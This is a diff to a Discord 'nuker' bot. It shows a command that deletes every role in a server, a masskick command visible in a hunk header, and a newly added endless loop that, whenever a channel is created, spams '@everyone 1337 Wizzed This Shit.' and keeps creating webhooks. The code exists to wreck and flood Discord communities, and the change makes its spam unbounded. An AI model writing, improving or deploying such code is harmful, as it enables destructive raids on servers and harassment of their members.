@@ -191,11 +191,11 @@ async def masskick(ctx, guild):
 @bot.command()
 async def delroles(ctx):
  for role in list(ctx.guild.roles):
-            try:
-                await role.delete()
-                print (f"{role.name} has been deleted in {ctx.guild.name}")
-            except:
-                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
+    try:
+      await role.delete()
+      print (f"{role.name} has been deleted in {ctx.guild.name}")
+    except:
+      print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
 
 @bot.command()
 async def clear(ctx, amount=5):
@@ -224,6 +224,7 @@ async def force_restart(ctx):
 
 @bot.event
 async def on_guild_channel_create(channel):
+  while True:
     await channel.send("@everyone 1337 Wizzed This Shit.")
     webhook = await channel.create_webhook(name="1337")
     webhook_url = webhook.url
